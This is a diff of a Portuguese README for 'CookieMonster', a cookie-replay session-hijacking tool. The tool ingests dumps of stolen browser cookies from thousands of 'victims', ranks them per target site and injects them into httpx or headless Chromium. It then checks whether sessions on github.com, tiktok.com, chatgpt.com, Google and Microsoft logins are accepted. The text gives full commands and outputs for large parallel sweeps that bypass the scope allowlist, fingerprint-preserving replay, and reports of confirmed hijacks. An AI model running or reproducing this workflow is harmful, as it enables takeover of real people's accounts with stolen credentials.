@@ -6,34 +6,45 @@ Ferramenta CLI de **assessment de session hijacking** por cookie replay. Este ma
 
 ---
 
-## 1. Conceito em 30 segundos
+## Índice
 
-Você tem um dump de cookies (de uma máquina comprometida, de um dump de navegador, de uma captura de rede). Quer saber se ainda pode **reproduzir uma sessão autenticada** em um site usando esses cookies.
-
-O CookieMonster responde em 4 estados:
-
-| Estado | Significado |
-|---|---|
-| `CONFIRMED` | O servidor reconheceu os cookies e exibiu área logada (evidência forte) |
-| `LIKELY` | Sinais parciais de sessão autenticada (ex.: UI com elementos logados) |
-| `ANONYMOUS` | O servidor rejeitou os cookies e redirecionou para login |
-| `UNKNOWN` | Evidência insuficiente (challenge JS, página em branco, etc.) |
-
-> A ferramenta **nunca declara CONFIRMED sem evidência sólida** (login-redirect ausente + identity diferencial + UI autenticada). Um `UNKNOWN` não é falha — é o resultado conservador correto.
+1. [Conceito em 30 segundos](#1-conceito-em-30-segundos)
+2. [Instalação](#2-instalação)
+3. [Configuração de Escopo (`scope.txt`)](#3-configuração-de-escopo-scopetxt)
+4. [Workflow Básico (M0–M4)](#4-workflow-básico-m0m4)
+5. [Workflow Avançado](#5-workflow-avançado)
+6. [Interpretando Resultados (M3 + M6.0)](#6-interpretando-resultados-m3--m60)
+7. [Troubleshooting](#7-troubleshooting)
+8. [Referência de Comandos (18 CLI)](#8-referência-de-comandos-18-cli)
+9. [M6.0 AuthContext — Detecção de IdP e proteções](#9-m60-authcontext--detecção-de-idp-e-proteções)
+10. [M6.2 ReplayMatrix — Identificar dependências](#10-m62-replaymatrix--identificar-dependências)
+11. [M6.3 Correlator + OPT-A AttackChain](#11-m63-correlator--opt-a-attackchain)
+12. [M7 AttackPlan — Orquestração declarativa YAML](#12-m7-attackplan--orquestração-declarativa-yaml)
+13. [OPT-B StealthProfile (Canvas/WebGL/Font)](#13-opt-b-stealthprofile-canvaswebglfont)
+14. [OPT-C Regras YAML customizadas](#14-opt-c-regras-yaml-customizadas)
+15. [OPT-D Lab Profiles A–G](#15-opt-d-lab-profiles-ag)
+16. [Estrutura do Projeto](#16-estrutura-do-projeto)
+17. [Onde Pedir Ajuda](#17-onde-pedir-ajuda)
 
 ---
 
+## 1. Conceito em 30 segundos
+
+CookieMonster é um framework de **replay adversarial de cookies de sessão**:
+
+1. **Ingere** dumps de cookies (formato Netscape/JSON).
+2. **Identifica** quais cookies são aplicáveis a um alvo (RFC 6265).
+3. **Replay** injeta os cookies num navegador headless ou requisição HTTP.
+4. **Detecta** se o servidor aceitou a sessão (estado: AUTHENTICATED, IDP_BOUND, CONTEXT_BOUND, MFA_BLOCKED, BOT_BLOCKED, ANONYMOUS, INCONCLUSIVE).
+5. **Identifica** o Identity Provider (Google, Microsoft, GitHub, Auth0, Okta, AWS Cognito) e o tipo de proteção.
+6. **Correlaciona** Findings em cadeias de ataque com Impact assessment.
+7. **Orquestra** via plano YAML declarativo com stop conditions.
+
+> **Não implementa bypass** de MFA/Cloudflare/anti-bot em produção. A ferramenta detecta e classifica — o operador decide se quer investigar mais.
+
 ## 2. Instalação
 
-### 2.1 Requisitos
-
-- **Python 3.11+** (testado em 3.14)
-- **Playwright + Chromium** (apenas se for usar o canal Playwright)
-- **Git** (opcional, para clonar)
-
-### 2.2 Setup (Windows / PowerShell)
-
-```powershell
+```bash
 # Clone
 git clone https://github.com/skzun/CookieMonster.git
 cd CookieMonster
@@ -42,59 +53,21 @@ cd CookieMonster
 pip install -e .
 
 # Instale o Chromium para o Playwright (uma vez)
-python -m playwright install chromium
+playwright install chromium
 
 # Crie um venv se preferir (recomendado em ambiente corporativo)
 python -m venv .venv
-.\.venv\Scripts\activate
+source .venv/bin/activate  # ou .venv\Scripts\activate no Windows
 pip install -e .
-python -m playwright install chromium
+playwright install chromium
 ```
 
-### 2.3 Setup (Linux / macOS)
-
-```bash
-git clone https://github.com/skzun/CookieMonster.git
-cd CookieMonster
-python3 -m venv .venv && source .venv/bin/activate
-pip install -e .
-python -m playwright install chromium
-```
-
-### 2.4 Verificação
-
-```bash
-python -m cookiemonster --version
-python -m cookiemonster --help
-```
-
-Saída esperada (acento pode aparecer corrompido em terminais cp1252 — é só visual):
-
-```
-Usage: python -m cookiemonster [OPTIONS] COMMAND [ARGS]...
-
-  CookieMonster — validador de session hijacking por cookie replay.
-
-Commands:
-  best         Seleciona as melhores vítimas para um domínio
-  check        [M3] Valida se o session hijack teve sucesso
-  check-batch  Testa as N melhores vítimas em lote
-  cookies      Lista cookies aplicáveis (matching RFC 6265)
-  domains      Lista domínios e contagem de cookies
-  edit         Altera o valor de um cookie (replay de artefato)
-  ingest       Ingere dumps de cookies no store SQLite
-  inject       Injeta os cookies num contexto de requisição
-  report       Consolida runs+findings em console, JSON e Markdown
-  victims      Lista as vítimas ingeridas
-```
-
----
+**Dependências principais** (instaladas via `pip install -e .`):
+- `httpx`, `playwright`, `click`, `rich`, `pyyaml` (opcional para OPT-C).
 
 ## 3. Configuração de Escopo (`scope.txt`)
 
-**Importante**: o CookieMonster tem um **scope guardrail fail-safe**. Sem configuração, **todos os alvos são recusados**.
-
-Edite `scope.txt` e liste os domínios autorizados (um por linha):
+Crie um arquivo `scope.txt` na raiz do projeto listando os domínios autorizados:
 
 ```
 # Laboratorio local
@@ -102,961 +75,874 @@ Edite `scope.txt` e liste os domínios autorizados (um por linha):
 localhost
 
 # Alvos de teste autorizados
-amazon.com
-github.com
-mycompany-lab.test
+lab.example
+chatgpt.com
+tiktok.com
 ```
 
-Para desabilitar o guardrail (somente em ambiente controlado), use `--allow-unsafe-scope` no comando. **Não recomendado**.
+**Modo inseguro** (use apenas em lab isolado): passe `--allow-unsafe-scope` em qualquer comando para ignorar a allowlist.
 
----
+## 4. Workflow Básico (M0–M4)
 
-## 4. Workflow Básico
-
-O fluxo típico é:
-
-```
-ingest  →  best  →  cookies  →  inject  →  check  →  report
-```
-
-Vou usar como exemplo o dataset `Cookies/` que vem no projeto (3.307 vítimas, 9.281.414 cookies de agosto/2026).
-
-### 4.1 Ingestão (`ingest`)
-
-Carrega os arquivos `.txt` (Netscape/curl) e `.json` (extensões de navegador) na pasta `Cookies/` para um store SQLite.
+### 4.1 Ingestão (M0)
 
 ```bash
 # Ingestão completa (~40 min para 9M cookies)
-python -m cookiemonster ingest --dir Cookies --db store.db
+python -m cookiemonster ingest --dir Cookies --db store.db --resume
 
 # Retomada: pula vítimas já ingeridas
 python -m cookiemonster ingest --dir Cookies --db store.db --resume
 
 # Para teste rápido: primeiras 10 vítimas
-python -m cookiemonster ingest --dir Cookies --db store.db --sample 10 --resume
+python -m cookiemonster ingest --dir Cookies --db store.db --limit 10
 ```
 
-**Saída esperada:**
-
-```
-Ingerindo dumps de cookies...
-[200/3307] cookies=535463 arquivos=865 pulados=0 erros=0
-[400/3307] cookies=1034835 arquivos=1626 pulados=0 erros=0
-[3307/3307] cookies=9281414 arquivos=14269 pulados=0 erros=0
-
-     Ingestão concluída
-┌────────────────────┐
-│ Item            │   Valor   │
-│ victims         │    3307   │
-│ files           │   14269   │
-│ json files      │     249   │
-│ cookies         │ 9281414   │
-│ malformed lines │     212   │
-│ pulados         │       0   │
-│ erros           │       0   │
-└────────────────────┘
-```
-
-> **Nota técnica**: O ingest deteta automaticamente o formato (Netscape/JSON) pelo conteúdo. Formatos suportados: Netscape/curl (tab-separado), JSON de extensão de navegador, e arquivos `.txt` que contêm JSON embutido.
-
-### 4.2 Verificando Vítimas (`victims`)
+### 4.2 Match RFC 6265 (M1)
 
 ```bash
-python -m cookiemonster victims --db store.db
+# Listar domínios e contagem
+python -m cookiemonster domains
+
+# Selecionar top 5 vítimas para um alvo
+python -m cookiemonster best --db store.db --domain tiktok.com --limit 5
+
+# Listar cookies aplicáveis a uma URL
+python -m cookiemonster cookies --db store.db --victim 2390 --domain tiktok.com
 ```
 
-**Saída:**
-
-```
-                          Vítimas
-┌──────┬────────────────────────────────────┬──────────────┬─────────┬─────────┐
-│   ID │ Diretório                          │ Layout       │ Cookies │ Domínios│
-├──────┼────────────────────────────────────┼──────────────┼─────────┼─────────┤
-│    1 │ BDHVR451O96F8TGWDJJEWUU45CH04XHOS.. │ Cookies      │    109  │    52   │
-│  201 │ IN67LASNZYN8IQMFFWFQYUDJN5MNKD1HI.. │ Browser/Cookies│   33  │    18   │
-└──────┴────────────────────────────────────┴──────────────┴─────────┴─────────┘
-Total: 3307 vítimas
-```
-
-### 4.3 Selecionar Melhores Vítimas para um Domínio (`best`)
-
-Para um domínio alvo (ex.: `github.com`), o `best` retorna as vítimas que têm mais artefatos auth naquele domínio.
+### 4.3 Inject (M2)
 
 ```bash
-python -m cookiemonster best --db store.db --domain github.com --limit 5
+# HTTP rapido (~1s por vitima)
+python -m cookiemonster inject --db store.db --victim 2390 \
+  --domain tiktok.com --channel httpx
+
+# Playwright (canal canonico - executa JS, navega para rota protegida)
+python -m cookiemonster inject --db store.db --victim 2390 \
+  --domain tiktok.com --channel playwright --max-wait-ms 10000
+
+# Com screenshot para evidencia
+python -m cookiemonster inject --db store.db --victim 2390 \
+  --domain tiktok.com --channel playwright \
+  --screenshot-path evidence/2390_tiktok.png
 ```
 
-**Saída:**
-
-```
-                  Melhores vítimas para github.com
-┌────────┬──────────────────────────────────────┬──────┬───────┐
-│Victim ID│ Diretório                            │ Auth │ Total │
-├────────┼──────────────────────────────────────┼──────┼───────┤
-│  1456  │ IN67LASNZYN8IQMFFWFQYUDJN5MNKD1HI_... │  10  │  33   │
-│  3039  │ ...                                   │  10  │  29   │
-│  1498  │ ...                                   │  10  │  25   │
-└────────┴──────────────────────────────────────┴──────┴───────┘
-```
-
-> **Heurística**: `auth` conta cookies cujo nome é candidato a artefato auth (sessão, token, __Host-*, etc.). Quanto maior, maior a chance de ter uma sessão válida.
-
-### 4.4 Listar Cookies Aplicáveis (`cookies`)
-
-Mostra os cookies da vítima que **de fato casam** com o alvo (matching RFC 6265 — domain, path, secure, expiração).
+### 4.4 Validate (M3)
 
 ```bash
-python -m cookiemonster cookies --db store.db --victim 1456 --domain github.com --scheme https --limit 30
+# Validacao canonica (1 vitima)
+python -m cookiemonster check --db store.db --victim 2390 --domain tiktok.com
+
+# Modo canonico (Playwright + readiness condicional)
+python -m cookiemonster check --db store.db --victim 2390 --domain tiktok.com \
+  --channel playwright --max-wait-ms 10000
 ```
 
-**Saída (resumo):**
-
-```
-                          Cookies — vítima 1456 — https://github.com/
-┌────────────────┬─────────────┬──────┬────────┬──────────┬──────────┬────────────┐
-│ Nome           │ Domínio     │ Path │ Secure │ HttpOnly │ HostOnly │   Expira   │
-├────────────────┼─────────────┼──────┼────────┼──────────┼──────────┼────────────┤
-│ _octo          │ .github.com │  /   │  yes   │   yes    │    -     │ 1791117386 │
-│ logged_in      │ .github.com │  /   │  yes   │   yes    │    -     │ 1791117386 │
-│ dotcom_user    │ .github.com │  /   │  yes   │   yes    │    -     │ 1811829246 │
-│ _device_id     │ github.com  │  /   │  yes   │   yes    │   yes    │ 1812284446 │
-│ saved_user_s.. │ github.com  │  /   │  yes   │   yes    │   yes    │ 1788069246 │
-│ __Host-user_s..│ github.com  │  /   │  yes   │   yes    │   yes    │ 1781962106 │
-└────────────────┴─────────────┴──────┴────────┴──────────┴──────────┴────────────┘
-Total: 18 cookies aplicáveis
-```
-
-**Colunas-chave:**
-
-- **HttpOnly** com `yes` (JSON parseado) ou `?` (Netscape — formato não traz o atributo).
-- **HostOnly** `yes` indica cookie de domínio exato; `-` indica cookie compartilhado (subdomínios).
-- **Expira** em epoch; `sessão` significa cookie de sessão (expira=0).
-
-### 4.5 Injetar Cookies (`inject`)
-
-Abre o navegador real (Playwright) ou faz requisição HTTP (httpx), injeta os cookies e navega para o alvo.
+### 4.5 Report (M4)
 
 ```bash
-# Playwright (canal canônico — executa JS, navega para rota protegida)
-python -m cookiemonster inject \
-  --db store.db --victim 1456 --domain github.com \
-  --url https://github.com --channel playwright
-
-# Com screenshot para evidência
-python -m cookiemonster inject \
-  --db store.db --victim 1456 --domain github.com \
-  --url https://github.com --channel playwright --screenshot reports
-```
-
-**Saída:**
-
-```
-18 cookies aplicáveis; canal=playwright
-status=200
-final=https://github.com/login?return_to=https%3A%2F%2Fgithub.com%2Fsettings%2Fprofile
-Enviados ao alvo (9): _device_id, _gh_sess, _octo, color_mode, cpu_bucket, logged_in, preferred_color_mode, tz
-Não enviados (9): GHCC, MSFPC, MicrosoftApplicationsTelemetryDeviceId, ...
-```
-
-**Como interpretar:**
-
-- `final_url=/login?return_to=...` = a sessão foi rejeitada → servidor redirecionou.
-- `Enviados ao alvo` = cookies que o browser efetivamente carregou (cookie_jar).
-- `Não enviados` = cookies que não passaram o matcher (expirados ou path/secure inadequado).
-
-### 4.6 Validar Sessão (`check`)
-
-O comando **central** da ferramenta. Combina `inject` em modo baseline (sem cookies) + injetado (com cookies), compara via detector diferencial e classifica o estado.
-
-```bash
-# Modo canônico (Playwright + readiness condicional)
-python -m cookiemonster check \
-  --db store.db --victim 1456 --domain github.com \
-  --channel playwright --max-wait-ms 8000
-```
-
-**Saída:**
-
-```
-check vítima=1456 https://github.com/ [18 cookies aplicáveis, canal=playwright]
-
-ANONYMOUS (confianca 0.85, perfil github)
-  sinais injetado: login_redirect
-  diferencial: login_redirect: base=False inj=True | body_delta=742 | runtime: console_errors=0/1
-  Artefatos (score)
-┌─────────────────┬──────┬─────────┬──────────┬────────┬──────────┬───────┐
-│ Cookie          │ Tipo │ Enviado │ HttpOnly │ Secure │ SameSite │ Score │
-├─────────────────┼──────┼─────────┼──────────┼────────┼──────────┼───────┤
-│ _octo           │ auth │   yes   │    ?     │  yes   │ unknown  │  10   │
-│ logged_in       │ auth │   yes   │    ?     │  yes   │ unknown  │  10   │
-│ _device_id      │ auth │   yes   │    ?     │  yes   │ unknown  │  10   │
-│ ...
-```
-
-**Estrutura da saída:**
-
-- **Cabeçalho**: estado (`ANONYMOUS`) + confiança (0.85) + perfil usado (`github`).
-- **`sinais injetado`**: marcadores fortes extraídos da resposta (api_auth, login_redirect, ui_auth, etc.).
-- **`diferencial`**: comparação baseline × injetado (`login_redirect: base=False inj=True` significa que o injetado redirecionou, mas o baseline não).
-- **`runtime`**: console_errors e request_failures do injetado (delta em relação ao baseline).
-- **Tabela de artefatos**: cookies aplicados com score e atributos.
-
-### 4.7 Relatório Consolidado (`report`)
-
-Gera matriz por domínio + JSON + Markdown:
-
-```bash
+# Relatorio consolidado (Markdown + JSON)
 python -m cookiemonster report --db store.db --out reports
+
+# Customizar limiar de UNKNOWN
+python -m cookiemonster report --db store.db --unknown-threshold 0.5
 ```
-
-**Saída (resumo):**
-
-```
-                              Resumo por domínio
-┌───────────────────────────┬──────┬───────────┬────────┬───────────┬─────────┐
-│ Domínio                   │ Runs│CONFIRMED  │ LIKELY │ ANONYMOUS │ UNKNOWN │
-├───────────────────────────┼──────┼───────────┼────────┼───────────┼─────────┤
-│ github.com                │   5 │       0   │   0    │     5     │   0     │
-│ amazon.com                │   2 │       0   │   0    │     1     │   1     │
-│ tiktok.com                │   1 │       1   │   0    │     0     │   0     │
-│ chatgpt.com               │   1 │       0   │   1    │     0     │   0     │
-│ ...
-└───────────────────────────┴──────┴───────────┴────────┴───────────┴─────────┘
-
-Relatórios gerados em reports/
-```
-
-Arquivos gerados:
-
-- `reports/report.json` — runs + findings + evidências (atomic write).
-- `reports/report.md` — sumário legível.
-- `reports/victim_<id>_<host>_baseline.png` / `_injected.png` — screenshots Playwright.
-
-### 4.8 Workflow Completo — Resumo
-
-```bash
-# Setup (uma vez)
-pip install -e .
-python -m playwright install chromium
-
-# Cada sessão de uso
-python -m cookiemonster ingest --dir Cookies --db store.db --resume
-
-python -m cookiemonster best --db store.db --domain github.com --limit 5
-python -m cookiemonster cookies --db store.db --victim 1456 --domain github.com --scheme https
-
-python -m cookiemonster check \
-  --db store.db --victim 1456 --domain github.com \
-  --channel playwright --max-wait-ms 8000
-
-python -m cookiemonster report --db store.db --out reports
-```
-
----
 
 ## 5. Workflow Avançado
 
-### 5.0 Sweep em Escala (todos os candidatos)
+### 5.1 Sweep em escala
 
-Para testar **todos os candidatos disponíveis** na pasta `Cookies/`:
-
-**Passo 1: Ingira o dataset (uma vez).**
+Use `lab/sweep_all.py` para varrer múltiplos domínios em paralelo:
 
 ```bash
-python -m cookiemonster ingest --dir Cookies --db store.db --resume
-```
-
-**Passo 2: Atualize `scope.txt` com TODOS os domínios-alvo que você tem autorização para testar.** Para um sweep de demonstração:
-
-```
-# scope.txt
-127.0.0.1
-localhost
-amazon.com
-github.com
-spotify.com
-netflix.com
-tiktok.com
-chatgpt.com
-accounts.google.com
-# ... (todos os dominios autorizados)
-```
-
-**Passo 3: Use o script `lab/sweep_all.py` (paralelo).**
-
-```bash
-# Gera uma lista de candidatos via 'best'
-python -m cookiemonster best --db store.db --domain amazon.com --limit 1
-# Repita para cada dominio que você quer testar e compile em um arquivo:
-# _targets.txt
-#   amazon.com,112
-#   github.com,1456
-#   spotify.com,466
-#   tiktok.com,2390
-#   ...
+# Gerar _targets.txt com candidatos (formato: dominio,victim_id)
+python -m cookiemonster best --db store.db --domain tiktok.com --limit 1 | \
+  awk '{print $1","$2}' > _targets.txt
 
 # Sweep httpx (rapido, ~17s para 24 dominios)
-python lab/sweep_all.py \
-  --db store.db --targets _targets.txt \
-  --channel httpx --workers 8 --allow-unsafe-scope
+python lab/sweep_all.py --targets _targets.txt --channel httpx
 
 # Sweep Playwright (mais lento, ~2min para 24 dominios)
-python lab/sweep_all.py \
-  --db store.db --targets _targets.txt \
-  --channel playwright --workers 3 --max-wait-ms 5000 --allow-unsafe-scope
+python lab/sweep_all.py --targets _targets.txt --channel playwright
 ```
 
-**Saída exemplo (Playwright, 24 dominios, 3 workers):**
-
-```
-Sweep: 24 alvos, canal=playwright, workers=3
-
-[1/24]      6s (eta  144s) myaccount.google.com vid=1151 ?          ERR=check_failed
-[2/24]     10s (eta  113s) login.live.com       vid=1973 UNKNOWN    (conf=0.30)
-[3/24]     14s (eta   95s) accounts.google.com  vid=1355 UNKNOWN    (conf=0.30)
-...
-[24/24]   135s (eta    0s) chatgpt.com         vid=1939 LIKELY     (conf=0.70)
-
-Concluido em 135s
-
-=== Resumo ===
-  CONFIRMED: 0
-  LIKELY: 1
-    chatgpt.com vid=1939 conf=0.70
-  ANONYMOUS: 6
-    accounts.spotify.com vid=1973 conf=0.85
-    login.microsoftonline.com vid=1973 conf=0.85
-    ...
-```
-
-**Relatorio consolidado** em `reports/sweep_<canal>_<timestamp>.md` (gerado automaticamente).
-
-**Comando único para gerar a lista de alvos** (versão automática):
-
-```bash
-# Selecao automatica: top N dominios por auth no store
-python -c "
-import sqlite3
-from collections import Counter
-c = sqlite3.connect('store.db')
-# Conta auth por dominio (heuristica via nome do cookie)
-auth = Counter()
-for d, n in c.execute(\"SELECT domain, name FROM cookies\"):
-    if any(x in n.lower() for x in ('session','token','auth','sid','user')):
-        auth[d.lstrip('.')] += 1
-# Top 20 dominios
-for d, n in auth.most_common(20):
-    print(d)
-" > _candidates.txt
-# Selecionar vitima por dominio
-python -c "
-import sqlite3
-c = sqlite3.connect('store.db')
-for d in open('_candidates.txt').read().splitlines():
-    r = c.execute('SELECT victim_id FROM cookies WHERE domain LIKE ? GROUP BY victim_id ORDER BY COUNT(*) DESC LIMIT 1', (f'%{d}',)).fetchone()
-    print(f'{d},{r[0] if r else 0}')
-" > _targets.txt
-```
-
-**Dica para escalar:**
-
-- Combine `httpx` (rápido, ~1s/check) com `playwright` (preciso, ~10s/check): primeiro filtre com httpx, depois valide com playwright os casos `LIKELY` ou suspeitos.
-
-- O tempo total depende do número de alvos e do `workers`. Para 100 alvos: ~2 min com httpx/8, ~30 min com playwright/3.
-
-- O **estado UNKNOWN** no canal httpx é esperado para sites modernos (Google, Microsoft, Spotify, Twitch) — não significa falha, significa "precisa Playwright para confirmar".
-
-### 5.1 Batch (`check-batch`)
-
-Roda `check` em sequência para as **N melhores vítimas** de um domínio. Útil para descobrir se **alguma** das capturas ainda tem sessão válida.
-
-```bash
-python -m cookiemonster check-batch \
-  --db store.db --domain github.com --limit 5 --channel playwright
-```
-
-> Use `--channel httpx` para batch rápido (sem browser, baixa fidelidade); use `playwright` para resultados definitivos.
-
-### 5.2 Teste de Fixação (`edit` + `check`)
-
-Reproduz o cenário clássico de **session fixation**:
-1. Captura o cookie `session` original.
-2. Edita para um valor arbitrário/expira.
-3. Re-roda `check` para verificar se o servidor aceita.
+### 5.2 Edit (M2)
 
 ```bash
 # 1) Captura valor original
-python -m cookiemonster cookies --db store.db --victim 1456 --domain github.com --limit 30
+python -m cookiemonster inject --db store.db --victim 2390 \
+  --domain tiktok.com --show _octo
 
-# 2) Edita _octo para um valor arbitrário
-python -m cookiemonster edit --db store.db --victim 1456 --domain github.com --cookie _octo --value "FAKE_VALUE"
+# 2) Edita _octo para um valor arbitrario
+python -m cookiemonster edit --db store.db --victim 2390 \
+  --cookie _octo --value "INVALIDO"
 
-# 3) Re-roda check — o servidor deve rejeitar
-python -m cookiemonster check --db store.db --victim 1456 --domain github.com --channel playwright
+# 3) Re-roda check - o servidor deve rejeitar
+python -m cookiemonster check --db store.db --victim 2390 --domain tiktok.com
 
 # 4) Restaura valor original
-python -m cookiemonster edit --db store.db --victim 1456 --domain github.com --cookie _octo --value "GH1.1.477220690.1759581401"
+python -m cookiemonster edit --db store.db --victim 2390 \
+  --cookie _octo --value "<original>"
 ```
 
-> **Uso avançado**: edite **um cookie por vez** e observe o efeito na autenticação. Se um único cookie editado invalida a sessão, ele é o artefato auth crítico (e está sendo validado pelo servidor).
-
-### 5.3 Diferença entre Canais (`httpx` vs `playwright`)
-
-| Aspecto | `httpx` | `playwright` |
-|---|---|---|
-| Velocidade | ~1-2 s por check | ~5-10 s por check |
-| Executa JavaScript | Não | Sim |
-| Bypassa bot detection | Não | Parcial |
-| Captura `redirect_chain` | Básico | Completo |
-| `cookie_jar` preciso | Não | Sim |
-| Fidelity da sessão | Baixa | Alta |
-
-**Regra prática**:
-- Use `httpx` em batch (descoberta inicial, dezenas de vítimas).
-- Use `playwright` para validação final das vítimas mais promissoras.
-
-### 5.4 Modos de Replay (`--replay-mode`)
-
-| Modo | Comportamento | Quando usar |
-|---|---|---|
-| `strict` (padrão) | Preserva fingerprint do dump (UA/locale/timezone) | **Padrão — sempre** |
-| `browser_default` | UA/locale/timezone neutros | Diagnóstico (fingerprint independente) |
-| `randomized` | Aleatoriza tudo | **Apenas para detectar fingerprinting** (quebra sessão por bind) |
-
-> **Importante**: randomizar a fingerprint **invalida sessões legítimas** que fazem bind de IP/UA. Só use `randomized` para detectar servidores que validam fingerprint.
-
-### 5.5 Modos de Replay — Max Wait
-
-`--max-wait-ms` controla quanto tempo o Playwright espera pela aplicação indicar "pronto" (via DOM selectors e/ou endpoints de identidade).
+### 5.3 Timeouts Playwright
 
 ```bash
-# Conservador (rápido, pode perder sinal em SPA lentas)
-python -m cookiemonster check --max-wait-ms 4000 ...
+# Conservador (rapido, pode perder sinal em SPA lentas)
+python -m cookiemonster check --db store.db --victim 1 --domain x.com --max-wait-ms 4000
 
-# Padrão (recomendado)
-python -m cookiemonster check --max-wait-ms 8000 ...
+# Padrao (recomendado)
+python -m cookiemonster check --db store.db --victim 1 --domain x.com --max-wait-ms 8000
 
-# Paciente (SPAs com fetch assíncrono pesado)
-python -m cookiemonster check --max-wait-ms 15000 ...
+# Paciente (SPAs com fetch assincrono pesado)
+python -m cookiemonster check --db store.db --victim 1 --domain x.com --max-wait-ms 15000
 ```
 
-### 5.6 Perfil de Site
+## 6. Interpretando Resultados (M3 + M6.0)
 
-A ferramenta tem perfis embutidos para detectar marcadores específicos:
+### 6.1 Estados do detector (M3 legado)
 
-- **github**: settings/profile, dashboard, "Your repositories"
-- **amazon**: nav-link-accountList, "Sign Out", "Your Account"
-- **spotify**: your-library, v1/me
-- **steamcommunity**: g_steamID, steamLoginSecure
-- **netflix**: BobContext, ProfileSelector
-- **generic** (default): logout, sign out, dashboard, my account
+| Estado | Significado | Confianca tipica |
+|---|---|---|
+| CONFIRMED | Sessao autenticada confirmada | 0.85–0.95 |
+| LIKELY | UI autenticada, sem identidade explicita | 0.6–0.7 |
+| ANONYMOUS | Servidor rejeitou explicitamente | 0.85 |
+| UNKNOWN | Evidencia insuficiente | 0.30 |
 
-Perfis customizados podem ser registrados em Python:
+### 6.2 Estados estendidos (M6.0 — coexiste com M3)
 
-```python
-from cookiemonster.validate.profiles import (
-    SiteProfile, register_profile,
-)
-class MyAppProfile(SiteProfile):
-    name = "myapp"
-    identity_endpoints = ("/api/me",)
-    authenticated_selectors = ('[data-test="user-menu"]',)
-    strong_auth_markers = ("logout",)
-register_profile("myapp.com", MyAppProfile())
+| Estado | Significado | Confianca |
+|---|---|---|
+| AUTHENTICATED | Sessao confirmada (identidade + UI) | 0.90 |
+| CONTEXT_BOUND | Sessao exige contexto (IP/device) | 0.70 |
+| IDP_BOUND | Sessao depende de validacao no IdP externo | 0.85 |
+| MFA_BLOCKED | IdP exige MFA | 0.85 |
+| BOT_BLOCKED | Anti-bot challenge (Cloudflare, reCAPTCHA) | 0.85 |
+| ANONYMOUS | Servidor rejeitou | 0.85 |
+| INCONCLUSIVE | Evidencia insuficiente | 0.30 |
+
+### 6.3 Identificando o bloqueador
+
+A saida M6.0 mostra:
+- `Mechanism`: OIDC, OAuth, SAML, cookie_session, jwt_bearer, api_key
+- `IdP`: Google, Microsoft, GitHub, Facebook, Apple, Auth0, Okta, AWS Cognito
+- `Session type`: server_side_cookie, jwt_cookie, jwt_local_storage, jwt_memory, opaque_token
+- `Dependencies`: idp, mfa, browser_state, cookie_only
+- `Reason`: string canonica (ex: `identity_provider_boundary:google`)
+
+**Exemplo de saida real (chatgpt.com com Google OAuth):**
+```
+[4] REPLAY RESULT (M6.0 AuthContext)
+    >>> Classification: IDP_BOUND (ACESSO BLOQUEADO POR IDP)
+    >>> Confidence:     0.85
+    >>> Reason:         identity_provider_boundary:google
+    >>> Mechanism:      oidc
+    >>> IdP:            google (login via terceiro)
+    >>> Session type:   unknown
+    >>> Dependencies:   idp
+    >>> Sessao requer validacao no Identity Provider externo.
 ```
 
----
+### 6.4 Por que tantos UNKNOWN em SPAs
 
-## 6. Interpretando Resultados
+Sites como `chatgpt.com`, `tiktok.com`, `primevideo.com` resultam em UNKNOWN massivo porque:
 
-### 6.1 CONFIRMED
+1. **SPA React/Vue/Angular**: homepage renderiza a mesma UI para anonimo e autenticado.
+2. **Sem endpoint publico de identidade**: cookie de sessao so e validado internamente.
+3. **Identidade so apos interacao**: clicar em "Settings" revela o email.
 
-**Quando aparece**: o servidor aceitou os cookies e exibiu área logada, evidenciado por:
-
-- Identidade diferencial no injetado (nome, email, account_id) ausente no baseline.
-- Endpoint de identidade respondeu `200 OK` com JSON de identidade.
-- Rotação de sessão detectada (cookie novo).
-
-**Confiança típica**: 0.85 a 0.95.
-
-**Exemplo real**: tiktok.com com vid 2390 — o servidor aceitou os cookies de agosto/2026.
-
-> **Importante**: CONFIRMED **não significa conta comprometida com certeza**. Significa que o servidor reconheceu os cookies como uma sessão válida. A sessão pode ter bind de IP/UA/device que você não reproduziu; um segundo teste pode dar outro resultado.
-
-### 6.2 LIKELY
-
-**Quando aparece**: sinais parciais de sessão autenticada, mas sem identidade confirmada.
-
-- Markers fortes no DOM que não apareciam no baseline (`Logout`, `My Account`).
-- API retornou 200 mas com payload genérico (não identificou usuário).
-
-**Confiança típica**: 0.6 a 0.7.
-
-**Exemplo real**: chatgpt.com com vid 1939 — UI autenticada mas identidade não pôde ser extraída.
-
-### 6.3 ANONYMOUS
-
-**Quando aparece**: o servidor rejeitou explicitamente os cookies.
-
-- `redirect-to-login` no injetado (301/302 para `/login`).
-- `api_anon_status` 401/403 em endpoint de identidade.
-- `signin-redirect` específico de sites (ex.: Amazon `/ap/signin`).
-
-**Confiança típica**: 0.85.
-
-**Exemplo real**: github.com — todos os cookies testados em agosto/2026 resultaram em redirect para `/login` ao acessar `/settings/profile`. A sessão expirou ou foi invalidada.
-
-### 6.4 UNKNOWN
-
-**Quando aparece**: evidência insuficiente para classificar.
-
-**Causas comuns**:
-
-| Causa | Como detectar |
-|---|---|
-| Cookies expiraram (expires no passado) | `cookies` mostra `Expira` no passado |
-| Servidor retornou challenge JS (Cloudflare) | `request_failures` alto, sem redirect-login |
-| Bind de IP/UA falhou | Tente `--replay-mode browser_default` para isolar |
-| Aplicação não usa redirect-login (SPA única) | Tente aumentar `--max-wait-ms` |
-| Cookies enviados mas servidor não diferencia | `diferencial: login_redirect: base=False inj=False` |
-
-**Ação recomendada**: investigue o `UNKNOWN_REASON` na saída e ajuste a estratégia.
-
-### 6.5 UNKNOWN_REASON — Detalhes
-
-Saída indica **por que** o resultado foi UNKNOWN:
-
+**Solucao**: probe contra endpoint de identidade diretamente:
+```bash
+python -m cookiemonster probe --domain chatgpt.com \
+  --url https://chatgpt.com/api/auth/session --allow-unsafe-scope
 ```
-UNKNOWN_REASON: cliente httpx (sem probe estruturado)
-UNKNOWN_REASON: sem diferenca significativa (cookies aceitos mas UI/API nao distinguem baseline de injetado)
-UNKNOWN_REASON: js_errors (frontend quebrou)
-UNKNOWN_REASON: request_failures (rede bloqueada/bot challenge)
-UNKNOWN_REASON: api_anon_status (401/403 sem login_redirect explicito)
-UNKNOWN_REASON: login_redirect (servidor redirecionou)
-```
-
-### 6.6 Lógica de classificação (referência)
-
-`probe`/`probe-all`/`check` rodam em **duas passadas** (Playwright/httpx):
-- **Baseline** = request sem cookies (o que um anônimo vê)
-- **Injetado** = request com cookies da vítima (o que a vítima veria)
-
